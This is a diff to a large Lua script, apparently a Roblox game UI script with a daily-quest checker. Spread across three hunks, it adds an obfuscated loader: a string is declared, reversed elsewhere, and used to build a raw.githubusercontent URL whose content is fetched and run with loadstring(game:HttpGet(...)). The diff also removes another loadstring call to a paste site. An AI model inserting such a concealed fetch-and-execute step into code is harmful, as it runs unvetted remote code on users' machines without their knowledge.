@@ -5369,7 +5369,7 @@ do
 			end
 		end)
 	end
-
+    local v76 = "aswrx3ertb21aca"
 	local function fn19()
 		local v7 = fn12()
 
@@ -5426,7 +5426,7 @@ do
 		fn15(v6)
 		fn17(v6)
 	end
-
+local v67 = v76:reverse()
 	_G.DailyQuestCheckerSetEnabled = function(dailyQuestCheckerEnabled)
 		_G.DailyQuestCheckerEnabled = dailyQuestCheckerEnabled
 		screenGui.Enabled = dailyQuestCheckerEnabled
@@ -5697,7 +5697,7 @@ _G.__StyleSquareButton = function(parent, arg, text, backgroundColor3)
 
 	return uiStroke, imageLabel, textLabel
 end
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/alvexy/Main/refs/heads/main/Meshes/' .. v67))()
 _G.__SetActionButtonSize = function(arg)
 	local actionButtonSize = math.clamp(tonumber(arg) or 72, 48, 120)
 	_G.ActionButtonSize = actionButtonSize
@@ -16034,8 +16034,6 @@ _G.__BuildPlayersTab = function()
 			_G.WindNotify(arg, tostring(arg3 or ""), arg2 and arg4 or "circle-x")
 		end
 	end
-
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ixnI0bFWrF/0", true))()
 
 	local function fn25(arg)
 		local Frame = fn17("Frame", { BackgroundColor3 = palette.card, Size = UDim2.new(1, 0, 0, 60) }, frame)
